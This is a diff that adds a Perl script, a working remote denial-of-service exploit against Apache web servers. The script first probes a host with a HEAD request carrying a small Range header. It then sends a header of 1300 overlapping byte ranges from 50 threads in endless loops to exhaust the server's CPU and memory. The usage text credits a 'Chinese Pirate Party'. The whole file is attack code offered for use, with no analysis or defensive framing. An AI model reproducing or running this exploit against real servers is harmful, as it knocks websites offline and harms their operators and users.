@@ -1,0 +1,87 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+use threads;
+
+sub usage
+{
+	print "Apache Remote DoS (CPU & memory exhaustion)\n";
+	print "Pirated by the Chinese Pirate Party (中国盗版党)\n";
+	print "Usage: $0 <attack> <host> [page=/] [threads=50]\n";
+	print "Example: $0 YES www.example.com index.html 50\n";
+	print "If attack is anything other than 'YES', then the tool will test and exit.\n";
+}
+
+sub testapache
+{
+	print "Testing for partial content exploit against $host$path...\n";
+
+	my $sock = IO::Socket::INET->new(PeerAddr => $host,
+		PeerPort => "80",
+		Proto    => 'tcp') or die "Can't open socket to $host!\n";
+
+	my $p = "HEAD $path HTTP/1.1\r\nHost: $host\r\nRange:bytes=0-5\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
+	print $sock $p;
+
+	my $x = <$sock>;
+	if ($x =~ /Partial/)
+	{
+		print "Host: $host appears to be vulnerable to partial content DoS\n";
+		return 1;
+		} else {
+		print "Host: $host appears to not be vulnerable, returned:\n$x";
+		return 0;
+	}
+}
+
+sub exploitserver
+{
+	my $sock = IO::Socket::INET->new(PeerAddr => $host,
+		PeerPort => "80",
+		Proto    => 'tcp') or return(0);
+	print $sock $p;
+
+	while(<$sock>)
+	{
+	}
+	print ".";
+}
+
+
+if($#ARGV < 1)
+{
+	&usage && exit;
+}
+
+$real = ($ARGV[0] eq 'YES');
+$host = $ARGV[1];
+$path = ($#ARGV > 1) ? '/' . $ARGV[2] : '/';
+$numthreads = ($#ARGV > 2) ? $ARGV[3] : 50;
+$vuln = &testapache;
+
+srand(time());
+my $r = "";
+
+for ($k=0;$k<1300;$k++)
+{
+	$r .= ",5-$k";
+}
+
+$p = "HEAD $path HTTP/1.1\r\nHost: $host\r\nRange:bytes=0-5$r\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
+if($vuln && $real)
+{
+	my @threads;
+	$|=1;
+
+	print "Running partial content exploit against $host$path using $numthreads threads\n";
+	for(my $n = 0; $n < $numthreads; $n++)
+	{
+		my $thr = async { while(1){ &exploitserver; } };
+		push(@threads, $thr);
+	}
+	foreach(@threads)
+	{
+		$_->join();
+		print($_);
+	}
+}
